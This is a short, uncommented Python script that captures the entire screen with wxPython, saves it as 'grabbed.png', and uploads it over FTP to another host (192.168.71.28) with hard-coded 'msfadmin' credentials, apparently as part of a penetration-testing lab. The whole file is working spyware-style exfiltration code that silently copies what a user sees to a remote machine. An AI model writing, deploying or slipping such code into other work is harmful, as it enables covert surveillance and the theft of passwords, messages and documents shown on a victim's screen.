
import wx
import os
import ftplib


w = wx.App()
screen = wx.ScreenDC()
size = screen.GetSize()
bmap = wx.Bitmap(size[0],size[1])
memo = wx.MemoryDC(bmap)
memo.Blit(0,0,size[0],size[1],screen,0,0)

del memo 
bmap.SaveFile("grabbed.png", wx.BITMAP_TYPE_PNG)


sess = ftplib.FTP("192.168.71.28", "msfadmin", "msfadmin")
file = open("grabbed.png", "rb")
sess.storbinary("STOR /tmp/grabbed.png", file)
file.close()
sess.quit()